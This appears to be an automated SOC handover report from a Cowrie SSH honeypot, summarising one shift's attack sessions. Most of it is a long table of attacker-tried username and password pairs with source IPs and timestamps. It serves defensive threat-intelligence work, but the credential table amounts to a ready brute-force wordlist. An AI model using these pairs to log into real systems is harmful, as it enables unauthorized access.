# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-24 |
| **Generated At** | 2026-07-24T17:41:52Z |
| **Shift Time** | 17:41 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **415** |
| Confirmed Threats | **395** |
| False Positives Filtered | **20** (4.8%) |
| Unique Attacker IPs | **84** |
| Countries of Origin | **23** |
| High Severity Cases | **360** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **55** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **386** |
| Unique Credential Pairs | **328** |
| Unique Usernames | **128** |
| Unique Passwords | **192** |
| Successful Auth Pairs | **372** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 82 |
| `admin` | 29 |
| `mysql` | 19 |
| `config` | 19 |
| `postgres` | 16 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 24 |
| `password` | 12 |
| `12345678` | 11 |
| `1234` | 9 |
| `1` | 9 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `77777` | 6 |
| `administrator` | `p@ssw0rd` | 5 |
| `config` | `techsupport` | 5 |
| `config` | `config2005` | 5 |
| `admin` | `admin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwerty123` | `45.153.34.144` | 2026-07-24T14:55:05 |
| `zahra` | `12345678` | `45.153.34.144` | 2026-07-24T14:55:13 |
| `gabriel` | `1q2w3e4r` | `45.153.34.144` | 2026-07-24T14:55:20 |
| `minecraft` | `123456` | `45.153.34.144` | 2026-07-24T14:55:27 |
| `gitlab-runner` | `test` | `45.153.34.144` | 2026-07-24T14:55:34 |
| `developer` | `123` | `45.153.34.144` | 2026-07-24T14:55:41 |
| `git` | `123456` | `45.153.34.144` | 2026-07-24T14:55:48 |
| `system` | `1qaz2wsx` | `45.153.34.144` | 2026-07-24T14:55:55 |
| `opc` | `opc` | `45.153.34.144` | 2026-07-24T14:56:03 |
| `root` | `huawei@123` | `45.153.34.144` | 2026-07-24T14:56:10 |
| `www` | `user` | `45.153.34.144` | 2026-07-24T14:56:18 |
| `deploy` | `root` | `45.153.34.144` | 2026-07-24T14:56:24 |
| `root` | `Passw0rd` | `45.153.34.144` | 2026-07-24T14:56:30 |
| `openvpn` | `12345678` | `45.153.34.144` | 2026-07-24T14:56:38 |
| `master` | `master` | `45.153.34.144` | 2026-07-24T14:56:45 |
| `fahmi` | `fahmi` | `45.153.34.144` | 2026-07-24T14:56:53 |
| `nexus` | `nexus` | `45.153.34.144` | 2026-07-24T14:56:59 |
| `jenkins` | `1234` | `45.153.34.144` | 2026-07-24T14:57:07 |
| `root` | `qQ123456` | `45.153.34.144` | 2026-07-24T14:57:14 |
| `app` | `root` | `45.153.34.144` | 2026-07-24T14:57:20 |
| `root` | `P@ssw0rd` | `45.153.34.144` | 2026-07-24T14:57:27 |
| `fastuser` | `12345678` | `45.153.34.144` | 2026-07-24T14:57:34 |
| `server` | `123456` | `45.153.34.144` | 2026-07-24T14:57:42 |
| `ubuntu` | `qwe123` | `45.153.34.144` | 2026-07-24T14:57:49 |
| `admin` | `1` | `45.153.34.144` | 2026-07-24T14:57:56 |
| `teamspeak` | `root` | `45.153.34.144` | 2026-07-24T14:58:03 |
| `ftpuser` | `123456789` | `45.153.34.144` | 2026-07-24T14:58:10 |
| `btc` | `btc` | `45.153.34.144` | 2026-07-24T14:58:17 |
| `root` | `ZAQ!2wsx` | `45.153.34.144` | 2026-07-24T14:58:24 |
| `frappe` | `frappe@123` | `45.153.34.144` | 2026-07-24T14:58:31 |
| `tom` | `tom` | `45.153.34.144` | 2026-07-24T14:58:38 |
| `administrator` | `p@ssw0rd` | `220.78.182.74` | 2026-07-24T14:58:43 |
| `david` | `123456` | `45.153.34.144` | 2026-07-24T14:58:45 |
| `user` | `password` | `45.153.34.144` | 2026-07-24T14:58:52 |
| `nginx` | `toor` | `45.153.34.144` | 2026-07-24T14:58:59 |
| `odoo` | `odoo` | `45.153.34.144` | 2026-07-24T14:59:06 |
| `tomcat` | `tomcat` | `45.153.34.144` | 2026-07-24T14:59:13 |
| `user3` | `1` | `45.153.34.144` | 2026-07-24T14:59:20 |
| `user1` | `123456` | `45.153.34.144` | 2026-07-24T14:59:27 |
| `frappe` | `frappe` | `45.153.34.144` | 2026-07-24T14:59:34 |
| `centreon` | `centreon` | `45.153.34.144` | 2026-07-24T14:59:40 |
| `prem` | `12345` | `45.153.34.144` | 2026-07-24T14:59:47 |
| `dmdba` | `dmdba` | `45.153.34.144` | 2026-07-24T14:59:54 |
| `oscar` | `oscar` | `45.153.34.144` | 2026-07-24T15:00:01 |
| `deployer` | `deployer` | `45.153.34.144` | 2026-07-24T15:00:08 |
| `root` | `pass` | `45.153.34.144` | 2026-07-24T15:00:16 |
| `dev` | `1qaz2wsx` | `45.153.34.144` | 2026-07-24T15:00:23 |
| `tester` | `12345` | `45.153.34.144` | 2026-07-24T15:00:29 |
| `azureuser` | `root` | `45.153.34.144` | 2026-07-24T15:00:36 |
| `pi` | `root` | `45.153.34.144` | 2026-07-24T15:00:43 |
| `cw` | `cw` | `45.153.34.144` | 2026-07-24T15:00:50 |
| `gg` | `gg` | `45.153.34.144` | 2026-07-24T15:00:57 |
| `admin2` | `admin2` | `45.153.34.144` | 2026-07-24T15:01:04 |
| `systemd` | `1q2w3e4r` | `45.153.34.144` | 2026-07-24T15:01:11 |
| `deploy` | `123123` | `45.153.34.144` | 2026-07-24T15:01:18 |
| `ansible` | `ansible` | `45.153.34.144` | 2026-07-24T15:01:25 |
| `administrator` | `12345678` | `45.153.34.144` | 2026-07-24T15:01:33 |
| `test3` | `1` | `45.153.34.144` | 2026-07-24T15:01:39 |
| `fivem` | `password` | `45.153.34.144` | 2026-07-24T15:01:47 |
| `claude` | `password` | `45.153.34.144` | 2026-07-24T15:01:53 |
| `root` | `Pass1234` | `45.153.34.144` | 2026-07-24T15:02:00 |
| `administrator` | `p@ssw0rd` | `123.129.245.249` | 2026-07-24T15:02:06 |
| `debian` | `qwerty` | `45.153.34.144` | 2026-07-24T15:02:07 |
| `administrator` | `p@ssw0rd` | `65.20.153.146` | 2026-07-24T15:02:14 |
| `admin` | `admin123!` | `45.153.34.144` | 2026-07-24T15:02:14 |
| `user` | `123` | `45.153.34.144` | 2026-07-24T15:02:21 |
| `deploy` | `dev` | `45.153.34.144` | 2026-07-24T15:02:28 |
| `administrator` | `p@ssw0rd` | `10.0.0.73` | 2026-07-24T15:02:33 |
| `dev` | `abc123` | `45.153.34.144` | 2026-07-24T15:02:35 |
| `admin` | `111` | `45.153.34.144` | 2026-07-24T15:02:42 |
| `root` | `abc123456` | `45.153.34.144` | 2026-07-24T15:02:49 |
| `rdpuser` | `rdpuser` | `45.153.34.144` | 2026-07-24T15:02:56 |
| `root` | `Welcome@123` | `45.153.34.144` | 2026-07-24T15:03:03 |
| `ai` | `Aa123456` | `45.153.34.144` | 2026-07-24T15:03:10 |
| `devuser` | `devuser` | `45.153.34.144` | 2026-07-24T15:03:16 |
| `elasticsearch` | `elasticsearch@1234` | `45.153.34.144` | 2026-07-24T15:03:23 |
| `root` | `qwe@123` | `45.153.34.144` | 2026-07-24T15:03:30 |
| `root` | `!Q@W3e4r` | `45.153.34.144` | 2026-07-24T15:03:38 |
| `server` | `server` | `45.153.34.144` | 2026-07-24T15:03:44 |
| `sam` | `1234567890` | `45.153.34.144` | 2026-07-24T15:03:52 |
| `testuser` | `test` | `45.153.34.144` | 2026-07-24T15:03:58 |
| `gitlab-runner` | `123` | `45.153.34.144` | 2026-07-24T15:04:06 |
| `teamspeak` | `123456` | `45.153.34.144` | 2026-07-24T15:04:13 |
| `ubuntu` | `ubuntu` | `45.153.34.144` | 2026-07-24T15:04:20 |
| `bot` | `123456` | `45.153.34.144` | 2026-07-24T15:04:28 |
| `newuser` | `newuser` | `45.153.34.144` | 2026-07-24T15:04:34 |
| `rajvir` | `rajvir123` | `45.153.34.144` | 2026-07-24T15:04:41 |
| `frappe` | `123` | `45.153.34.144` | 2026-07-24T15:04:48 |
| `debian` | `toor` | `45.153.34.144` | 2026-07-24T15:04:56 |
| `trade` | `123456` | `45.153.34.144` | 2026-07-24T15:05:02 |
| `vncuser` | `vncuser` | `45.153.34.144` | 2026-07-24T15:05:09 |
| `splunk` | `password` | `45.153.34.144` | 2026-07-24T15:05:16 |
| `plex` | `plex` | `45.153.34.144` | 2026-07-24T15:05:23 |
| `gabriel` | `123321` | `45.153.34.144` | 2026-07-24T15:05:31 |
| `jakob` | `jakob` | `45.153.34.144` | 2026-07-24T15:05:38 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-24T15:05:40 |
| `root` | `1qaz!QAZ` | `45.153.34.144` | 2026-07-24T15:05:45 |
| `asterisk` | `asterisk` | `45.153.34.144` | 2026-07-24T15:05:52 |
| `root` | `zaq12wsx` | `45.153.34.144` | 2026-07-24T15:06:00 |
| `data` | `test` | `45.153.34.144` | 2026-07-24T15:06:05 |
| `user` | `user123456` | `45.153.34.144` | 2026-07-24T15:06:12 |
| `myuser` | `myuser` | `45.153.34.144` | 2026-07-24T15:06:19 |
| `server` | `1234` | `45.153.34.144` | 2026-07-24T15:06:25 |
| `admin` | `AA@123456789` | `144.225.187.57` | 2026-07-24T15:06:28 |
| `345gs5662d34` | `345gs5662d34` | `144.225.187.57` | 2026-07-24T15:06:30 |
| `admin` | `3245gs5662d34` | `144.225.187.57` | 2026-07-24T15:06:30 |
| `root` | `123123` | `45.153.34.144` | 2026-07-24T15:06:31 |
| `root` | `dxfUgwfiNcx8` | `45.153.34.144` | 2026-07-24T15:06:37 |
| `minecraft` | `123` | `45.153.34.144` | 2026-07-24T15:06:44 |
| `amine` | `amine` | `45.153.34.144` | 2026-07-24T15:06:50 |
| `rocky` | `1` | `45.153.34.144` | 2026-07-24T15:06:57 |
| `jenkins` | `jenkins` | `45.153.34.144` | 2026-07-24T15:07:03 |
| `odoo17` | `12345` | `45.153.34.144` | 2026-07-24T15:07:09 |
| `supervisor` | `supervisor2004` | `2.54.85.220` | 2026-07-24T15:07:13 |
| `clawdbot` | `clawdbot` | `45.153.34.144` | 2026-07-24T15:07:14 |
| `claude` | `claude` | `45.153.34.144` | 2026-07-24T15:07:20 |
| `supervisor` | `supervisor2004` | `175.206.113.91` | 2026-07-24T15:07:22 |
| `root` | `admin1` | `45.153.34.144` | 2026-07-24T15:07:26 |
| `test2` | `test2` | `45.153.34.144` | 2026-07-24T15:07:31 |
| `root` | `28011988` | `45.153.34.144` | 2026-07-24T15:07:37 |
| `root` | `Yun@wocloud.szkj` | `45.153.34.144` | 2026-07-24T15:07:43 |
| `devops` | `devops` | `45.153.34.144` | 2026-07-24T15:07:49 |
| `root` | `1qaz@wsx` | `45.153.34.144` | 2026-07-24T15:07:55 |
| `git` | `1234` | `45.153.34.144` | 2026-07-24T15:08:01 |
| `test` | `test123` | `45.153.34.144` | 2026-07-24T15:08:07 |
| `root` | `!Q2w3e4r` | `45.153.34.144` | 2026-07-24T15:08:13 |
| `admin` | `password` | `45.153.34.144` | 2026-07-24T15:08:19 |
| `root` | `00000000` | `45.153.34.144` | 2026-07-24T15:08:25 |
| `root` | `test@123` | `45.153.34.144` | 2026-07-24T15:08:31 |
| `john` | `john` | `45.153.34.144` | 2026-07-24T15:08:37 |
| `postgres` | `1` | `45.153.34.144` | 2026-07-24T15:08:43 |
| `botuser` | `123` | `45.153.34.144` | 2026-07-24T15:08:49 |
| `packer` | `packer` | `45.153.34.144` | 2026-07-24T15:08:56 |
| `user2` | `user2` | `45.153.34.144` | 2026-07-24T15:09:02 |
| `git` | `dev` | `45.153.34.144` | 2026-07-24T15:09:08 |
| `pi` | `toor` | `45.153.34.144` | 2026-07-24T15:09:15 |
| `adminuser` | `123456` | `45.153.34.144` | 2026-07-24T15:09:21 |
| `test` | `test1234` | `45.153.34.144` | 2026-07-24T15:09:28 |
| `myuser` | `123456` | `45.153.34.144` | 2026-07-24T15:09:34 |
| `root` | `passwd` | `45.153.34.144` | 2026-07-24T15:09:41 |
| `root` | `Admin123` | `45.153.34.144` | 2026-07-24T15:09:47 |
| `test` | `888888` | `211.178.165.251` | 2026-07-24T15:09:53 |
| `pi` | `pi` | `45.153.34.144` | 2026-07-24T15:09:53 |
| `user` | `Aa123456` | `45.153.34.144` | 2026-07-24T15:09:59 |
| `test` | `passwd` | `45.153.34.144` | 2026-07-24T15:10:06 |
| `username` | `username` | `45.153.34.144` | 2026-07-24T15:10:12 |
| `customer` | `customer` | `45.153.34.144` | 2026-07-24T15:10:18 |
| `root` | `abc123` | `45.153.34.144` | 2026-07-24T15:10:24 |
| `agent` | `agent` | `45.153.34.144` | 2026-07-24T15:10:31 |
| `supervisor` | `supervisor2004` | `10.0.0.73` | 2026-07-24T15:10:33 |
| `odoo16` | `odoo16` | `45.153.34.144` | 2026-07-24T15:10:37 |
| `gd` | `gd` | `45.153.34.144` | 2026-07-24T15:10:43 |
| `vicky` | `vicky` | `177.53.215.134` | 2026-07-24T15:10:49 |
| `runner` | `test` | `45.153.34.144` | 2026-07-24T15:10:50 |
| `345gs5662d34` | `345gs5662d34` | `177.53.215.134` | 2026-07-24T15:10:51 |
| `vicky` | `3245gs5662d34` | `177.53.215.134` | 2026-07-24T15:10:52 |
| `admin` | `123456789` | `45.153.34.144` | 2026-07-24T15:10:57 |
| `pi` | `123456` | `45.153.34.144` | 2026-07-24T15:11:04 |
| `root` | `P@ssw0rd123` | `45.153.34.144` | 2026-07-24T15:11:11 |
| `root` | `123abc456` | `45.153.34.144` | 2026-07-24T15:11:17 |
| `jenkins` | `jenkins@123` | `45.153.34.144` | 2026-07-24T15:11:24 |
| `newuser` | `qwerty` | `45.153.34.144` | 2026-07-24T15:11:31 |
| `root` | `111` | `45.153.34.144` | 2026-07-24T15:11:37 |
| `localhost` | `localhost` | `45.153.34.144` | 2026-07-24T15:11:44 |
| `mysql` | `mysql123` | `45.153.34.144` | 2026-07-24T15:11:50 |
| `steam` | `1` | `45.153.34.144` | 2026-07-24T15:11:56 |
| `ubuntu` | `admin@123` | `45.153.34.144` | 2026-07-24T15:12:03 |
| `devops` | `123456` | `45.153.34.144` | 2026-07-24T15:12:10 |
| `root` | `root1234` | `45.153.34.144` | 2026-07-24T15:12:16 |
| `onkar` | `onkar123` | `45.153.34.144` | 2026-07-24T15:12:22 |
| `root` | `000000` | `45.153.34.144` | 2026-07-24T15:12:29 |
| `ftp` | `ftp123` | `45.153.34.144` | 2026-07-24T15:12:35 |
| `user` | `1qaz@WSX` | `45.153.34.144` | 2026-07-24T15:12:42 |
| `labuser` | `p@ssw0rd` | `45.153.34.144` | 2026-07-24T15:12:48 |
| `sftpuser` | `sftpuser` | `45.153.34.144` | 2026-07-24T15:12:54 |
| `root` | `1q2w3e4r` | `45.153.34.144` | 2026-07-24T15:13:01 |
| `dev` | `password` | `45.153.34.144` | 2026-07-24T15:13:08 |
| `deploy` | `user` | `45.153.34.144` | 2026-07-24T15:13:14 |
| `term2` | `term2` | `45.153.34.144` | 2026-07-24T15:13:21 |
| `test` | `888888` | `10.0.0.73` | 2026-07-24T15:13:26 |
| `root` | `Root@123` | `45.153.34.144` | 2026-07-24T15:13:28 |
| `root` | `Ac123456` | `45.153.34.144` | 2026-07-24T15:13:34 |
| `user` | `123456` | `45.153.34.144` | 2026-07-24T15:13:40 |
| `sdadmin` | `51nGleD` | `45.153.34.144` | 2026-07-24T15:13:46 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-24T15:13:49 |
| `deploy` | `toor` | `45.153.34.144` | 2026-07-24T15:13:52 |
| `ethan` | `ethan` | `45.153.34.144` | 2026-07-24T15:13:58 |
| `fivem` | `12345` | `45.153.34.144` | 2026-07-24T15:14:04 |
| `debian` | `debian44` | `179.185.227.77` | 2026-07-24T15:14:06 |
| `root` | `aB123456` | `45.153.34.144` | 2026-07-24T15:14:10 |
| `root` | `P@ssw0rd2026` | `45.153.34.144` | 2026-07-24T15:14:15 |
| `steam` | `steam123` | `45.153.34.144` | 2026-07-24T15:14:27 |
| `system` | `12345` | `45.153.34.144` | 2026-07-24T15:14:33 |
| `vbox` | `123456` | `45.153.34.144` | 2026-07-24T15:14:40 |
| `data` | `data` | `45.153.34.144` | 2026-07-24T15:14:46 |
| `deploy` | `password` | `45.153.34.144` | 2026-07-24T15:14:52 |
| `user` | `12345678` | `45.153.34.144` | 2026-07-24T15:14:58 |
| `liyang` | `123456` | `45.153.34.144` | 2026-07-24T15:15:04 |
| `bot` | `abc123` | `45.153.34.144` | 2026-07-24T15:15:10 |
| `admin` | `!QAZ2wsx` | `45.153.34.144` | 2026-07-24T15:15:16 |
| `uftp` | `uftp` | `45.153.34.144` | 2026-07-24T15:15:22 |
| `root` | `Aa112211..` | `45.153.34.144` | 2026-07-24T15:15:28 |
| `dmdba` | `dmdba123456` | `45.153.34.144` | 2026-07-24T15:15:34 |
| `ftpuser` | `p@ssw0rd` | `45.153.34.144` | 2026-07-24T15:15:40 |
| `ducc0x` | `phuvanduc` | `45.153.34.144` | 2026-07-24T15:15:46 |
| `root` | `111111` | `45.153.34.144` | 2026-07-24T15:15:53 |
| `root` | `0` | `45.153.34.144` | 2026-07-24T15:15:59 |
| `john` | `123456` | `45.153.34.144` | 2026-07-24T15:16:06 |
| `admin2` | `abc123` | `45.153.34.144` | 2026-07-24T15:16:12 |
| `ubuntu` | `123456789` | `45.153.34.144` | 2026-07-24T15:16:18 |
| `rdpuser` | `123` | `45.153.34.144` | 2026-07-24T15:16:23 |
| `user` | `qwe123456` | `45.153.34.144` | 2026-07-24T15:16:29 |
| `pi` | `p@ssw0rd` | `45.153.34.144` | 2026-07-24T15:16:34 |
| `ghost` | `ghost` | `45.153.34.144` | 2026-07-24T15:16:40 |
| `cloud` | `cloud` | `45.153.34.144` | 2026-07-24T15:16:46 |
| `alex` | `1` | `45.153.34.144` | 2026-07-24T15:16:52 |
| `root` | `hello123` | `45.153.34.144` | 2026-07-24T15:16:59 |
| `cloud` | `1` | `45.153.34.144` | 2026-07-24T15:17:05 |
| `martin` | `123456` | `45.153.34.144` | 2026-07-24T15:17:11 |
| `test` | `12345678` | `45.153.34.144` | 2026-07-24T15:17:17 |
| `deployer` | `dev` | `45.153.34.144` | 2026-07-24T15:17:23 |
| `david` | `david` | `45.153.34.144` | 2026-07-24T15:17:29 |
| `sam` | `123456789` | `45.153.34.144` | 2026-07-24T15:17:36 |
| `appuser` | `test` | `45.153.34.144` | 2026-07-24T15:17:42 |
| `administrator` | `administrator` | `45.153.34.144` | 2026-07-24T15:17:48 |
| `fastuser` | `1234567890` | `45.153.34.144` | 2026-07-24T15:17:54 |
| `crafty` | `1234` | `45.153.34.144` | 2026-07-24T15:18:00 |
| `root1` | `gg` | `45.153.34.144` | 2026-07-24T15:18:06 |
| `csgo` | `csgo` | `45.153.34.144` | 2026-07-24T15:18:12 |
| `ali` | `ali` | `45.153.34.144` | 2026-07-24T15:18:18 |
| `drcomadmin` | `drcomadmin123` | `45.153.34.144` | 2026-07-24T15:18:24 |
| `ec2-user` | `123456` | `45.153.34.144` | 2026-07-24T15:18:31 |
| `milad` | `milad` | `45.153.34.144` | 2026-07-24T15:18:38 |
| `root` | `Password@123` | `45.153.34.144` | 2026-07-24T15:18:45 |
| `ljd` | `1234` | `91.134.133.184` | 2026-07-24T15:18:47 |
| `345gs5662d34` | `345gs5662d34` | `91.134.133.184` | 2026-07-24T15:18:49 |
| `ljd` | `3245gs5662d34` | `91.134.133.184` | 2026-07-24T15:18:50 |
| `ftpuser` | `ftpuser` | `45.153.34.144` | 2026-07-24T15:18:51 |
| `root` | `qwertyuiop` | `45.153.34.144` | 2026-07-24T15:18:57 |
| `odoo17` | `odoo` | `45.153.34.144` | 2026-07-24T15:19:03 |
| `a` | `a` | `45.153.34.144` | 2026-07-24T15:19:09 |
| `amit` | `amit` | `45.153.34.144` | 2026-07-24T15:19:15 |
| `user4` | `user4` | `45.153.34.144` | 2026-07-24T15:19:21 |
| `crafty` | `crafty` | `45.153.34.144` | 2026-07-24T15:19:27 |
| `node` | `node` | `45.153.34.144` | 2026-07-24T15:19:34 |
| `root` | `Aa123123` | `45.153.34.144` | 2026-07-24T15:19:40 |
| `root` | `qwe123456` | `45.153.34.144` | 2026-07-24T15:19:46 |
| `ec2-user` | `12345678` | `45.153.34.144` | 2026-07-24T15:19:53 |
| `root` | `eve` | `45.153.34.144` | 2026-07-24T15:19:59 |
| `node` | `1qaz2wsx` | `45.153.34.144` | 2026-07-24T15:20:05 |
| `student` | `redhat` | `45.153.34.144` | 2026-07-24T15:20:11 |
| `ftpuser` | `ftpuser123` | `45.153.34.144` | 2026-07-24T15:20:17 |
| `runner` | `123456` | `45.153.34.144` | 2026-07-24T15:20:23 |
| `deploy` | `1` | `45.153.34.144` | 2026-07-24T15:20:29 |
| `root` | `password` | `45.153.34.144` | 2026-07-24T15:20:35 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-24T15:23:21 |
| `root` | `77777` | `138.219.13.21` | 2026-07-24T15:23:27 |
| `root` | `77777` | `103.67.152.201` | 2026-07-24T15:23:40 |
| `root` | `password` | `193.32.162.42` | 2026-07-24T15:24:00 |
| `root` | `admin` | `193.32.162.42` | 2026-07-24T15:25:29 |
| `root` | `77777` | `180.168.60.146` | 2026-07-24T15:26:44 |
| `root` | `77777` | `182.75.197.174` | 2026-07-24T15:26:53 |
| `root` | `toor` | `193.32.162.42` | 2026-07-24T15:26:59 |
| `root` | `77777` | `10.0.0.73` | 2026-07-24T15:27:10 |
| `root` | `12345` | `193.32.162.42` | 2026-07-24T15:28:28 |
| `root` | `123456789` | `193.32.162.42` | 2026-07-24T15:29:56 |
| `root` | `12345678` | `193.32.162.42` | 2026-07-24T15:31:23 |
| `root` | `passw0rd` | `193.32.162.42` | 2026-07-24T15:32:52 |
| `nobody` | `nobody2003` | `111.171.125.94` | 2026-07-24T15:33:28 |
| `root` | `admin123` | `193.32.162.42` | 2026-07-24T15:34:19 |
| `config` | `00` | `220.161.52.149` | 2026-07-24T15:34:28 |
| `centos` | `99` | `5.11.162.163` | 2026-07-24T15:35:24 |
| `root` | `1234` | `193.32.162.42` | 2026-07-24T15:35:49 |
| `root` | `qwerty` | `193.32.162.42` | 2026-07-24T15:37:20 |
| `config` | `00` | `10.0.0.73` | 2026-07-24T15:38:13 |
| `root` | `letmein` | `193.32.162.42` | 2026-07-24T15:38:49 |
| `centos` | `99` | `49.206.201.253` | 2026-07-24T15:38:52 |
| `centos` | `99` | `59.46.182.10` | 2026-07-24T15:39:01 |
| `root` | `Password1` | `193.32.162.42` | 2026-07-24T15:40:18 |
| `root` | `123123` | `193.32.162.42` | 2026-07-24T15:41:44 |
| `root` | `111111` | `193.32.162.42` | 2026-07-24T15:43:11 |
| `root` | `default` | `193.32.162.42` | 2026-07-24T15:44:38 |
| `root` | `system` | `193.32.162.42` | 2026-07-24T15:46:03 |
| `postgres` | `qwerty12` | `45.236.19.9` | 2026-07-24T15:48:17 |
| `admin` | `123456` | `193.32.162.42` | 2026-07-24T15:48:53 |
| `admin` | `password` | `193.32.162.42` | 2026-07-24T15:50:19 |
| `postgres` | `qwerty12` | `210.4.68.72` | 2026-07-24T15:51:40 |
| `admin` | `admin` | `193.32.162.42` | 2026-07-24T15:51:46 |
| `postgres` | `qwerty12` | `207.254.71.129` | 2026-07-24T15:51:51 |
| `admin` | `admin123` | `193.32.162.42` | 2026-07-24T15:53:14 |
| `config` | `techsupport` | `103.147.248.23` | 2026-07-24T15:53:28 |
| `config` | `techsupport` | `182.156.35.238` | 2026-07-24T15:53:36 |
| `admin` | `12345` | `193.32.162.42` | 2026-07-24T15:54:42 |
| `admin` | `123456789` | `193.32.162.42` | 2026-07-24T15:56:12 |
| `config` | `techsupport` | `65.20.146.109` | 2026-07-24T15:56:47 |
| `config` | `techsupport` | `10.0.0.73` | 2026-07-24T15:57:09 |
| `admin` | `passw0rd` | `193.32.162.42` | 2026-07-24T15:57:37 |
| `admin` | `12345678` | `193.32.162.42` | 2026-07-24T15:59:00 |
| `centos` | `6666` | `111.70.11.38` | 2026-07-24T15:59:11 |
| `centos` | `6666` | `60.169.120.17` | 2026-07-24T15:59:23 |
| `admin` | `Administrator` | `193.32.162.42` | 2026-07-24T16:00:23 |
| `admin` | `1234` | `193.32.162.42` | 2026-07-24T16:01:48 |
| `root` | `` | `94.154.43.92` | 2026-07-24T16:02:52 |
| `admin` | `welcome` | `193.32.162.42` | 2026-07-24T16:03:09 |
| `test` | `test777` | `10.0.0.73` | 2026-07-24T16:03:44 |
| `admin` | `qwerty` | `193.32.162.42` | 2026-07-24T16:04:32 |
| `admin` | `letmein` | `193.32.162.42` | 2026-07-24T16:05:52 |
| `admin` | `password1` | `193.32.162.42` | 2026-07-24T16:07:14 |
| `admin` | `123123` | `193.32.162.42` | 2026-07-24T16:08:35 |
| `admin` | `111111` | `193.32.162.42` | 2026-07-24T16:10:02 |
| `admin` | `access` | `193.32.162.42` | 2026-07-24T16:11:26 |
| `admin` | `adminadmin` | `193.32.162.42` | 2026-07-24T16:12:51 |
| `config` | `config666` | `49.124.151.28` | 2026-07-24T16:12:58 |
| `config` | `config666` | `213.130.207.177` | 2026-07-24T16:13:06 |
| `mysql` | `mysql` | `193.32.162.42` | 2026-07-24T16:14:19 |
| `mysql` | `password` | `193.32.162.42` | 2026-07-24T16:15:47 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-24T16:15:50 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-24T16:15:50 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-24T16:15:56 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-24T16:16:07 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-24T16:16:10 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-24T16:16:10 |
| `config` | `config666` | `10.0.0.73` | 2026-07-24T16:16:40 |
| `root` | `ubuntu` | `115.190.225.133` | 2026-07-24T16:16:48 |
| `mysql` | `123456` | `193.32.162.42` | 2026-07-24T16:17:18 |
| `mysql` | `root` | `193.32.162.42` | 2026-07-24T16:18:47 |
| `mysql` | `admin` | `193.32.162.42` | 2026-07-24T16:20:11 |
| `mysql` | `12345` | `193.32.162.42` | 2026-07-24T16:21:31 |
| `mysql` | `123456789` | `193.32.162.42` | 2026-07-24T16:22:53 |
| `mysql` | `passw0rd` | `193.32.162.42` | 2026-07-24T16:24:18 |
| `nobody` | `nobody999` | `117.71.53.210` | 2026-07-24T16:24:39 |
| `nobody` | `nobody999` | `187.126.105.42` | 2026-07-24T16:24:52 |
| `mysql` | `12345678` | `193.32.162.42` | 2026-07-24T16:25:40 |
| `mysql` | `1234` | `193.32.162.42` | 2026-07-24T16:27:04 |
| `config` | `99` | `112.26.101.76` | 2026-07-24T16:27:17 |
| `config` | `99` | `10.0.0.73` | 2026-07-24T16:27:33 |
| `mysql` | `database` | `193.32.162.42` | 2026-07-24T16:28:28 |
| `mysql` | `data` | `193.32.162.42` | 2026-07-24T16:29:51 |
| `mysql` | `qwerty` | `193.32.162.42` | 2026-07-24T16:31:15 |
| `mysql` | `letmein` | `193.32.162.42` | 2026-07-24T16:32:42 |
| `support` | `support` | `176.53.159.196` | 2026-07-24T16:33:28 |
| `mysql` | `123123` | `193.32.162.42` | 2026-07-24T16:34:10 |
| `support` | `support` | `10.0.0.73` | 2026-07-24T16:34:45 |
| `mysql` | `123` | `193.32.162.42` | 2026-07-24T16:35:37 |
| `mysql` | `backup` | `193.32.162.42` | 2026-07-24T16:36:57 |
| `blank` | `9999` | `222.99.52.202` | 2026-07-24T16:37:37 |
| `mysql` | `dbadmin` | `193.32.162.42` | 2026-07-24T16:38:18 |
| `postgres` | `postgres` | `193.32.162.42` | 2026-07-24T16:39:37 |
| `config` | `config2005` | `213.154.80.51` | 2026-07-24T16:39:50 |
| `config` | `config2005` | `59.8.111.106` | 2026-07-24T16:39:58 |
| `postgres` | `password` | `193.32.162.42` | 2026-07-24T16:40:58 |
| `blank` | `9999` | `203.92.36.109` | 2026-07-24T16:41:08 |
| `blank` | `9999` | `10.0.0.73` | 2026-07-24T16:41:21 |
| `postgres` | `123456` | `193.32.162.42` | 2026-07-24T16:42:21 |
| `config` | `config2005` | `178.178.222.53` | 2026-07-24T16:42:50 |
| `config` | `config2005` | `65.20.153.146` | 2026-07-24T16:42:58 |
| `config` | `config2005` | `10.0.0.73` | 2026-07-24T16:43:15 |
| `postgres` | `admin` | `193.32.162.42` | 2026-07-24T16:43:43 |
| `postgres` | `12345` | `193.32.162.42` | 2026-07-24T16:45:06 |
| `postgres` | `123456789` | `193.32.162.42` | 2026-07-24T16:46:27 |
| `postgres` | `passw0rd` | `193.32.162.42` | 2026-07-24T16:47:49 |
| `nobody` | `999` | `200.232.114.71` | 2026-07-24T16:48:31 |
| `nobody` | `999` | `65.20.204.88` | 2026-07-24T16:48:38 |
| `postgres` | `12345678` | `193.32.162.42` | 2026-07-24T16:49:08 |
| `postgres` | `1234` | `193.32.162.42` | 2026-07-24T16:50:31 |
| `postgres` | `psql` | `193.32.162.42` | 2026-07-24T16:51:53 |
| `nobody` | `999` | `90.228.229.182` | 2026-07-24T16:51:57 |
| `debian` | `666` | `189.56.0.19` | 2026-07-24T16:52:54 |
